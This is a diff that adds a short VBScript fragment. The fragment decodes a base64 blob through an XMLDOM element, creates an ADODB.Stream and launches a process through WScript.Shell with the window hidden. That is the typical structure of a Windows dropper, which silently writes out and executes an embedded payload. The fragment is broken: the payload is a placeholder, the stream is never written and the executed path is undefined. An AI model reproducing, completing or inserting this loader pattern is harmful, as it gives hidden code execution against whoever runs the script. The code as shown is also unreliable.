@@ -1,0 +1,8 @@
+Set x = CreateObject("Microsoft.XMLDOM")
+Set e = x.createElement("b64")
+e.dataType = "bin.base64"
+e.text = "AAAA"
+b = e.nodeTypedValue
+Set s = CreateObject("ADODB.Stream")
+CreateObject("WScript.Shell").Run p, 0
+
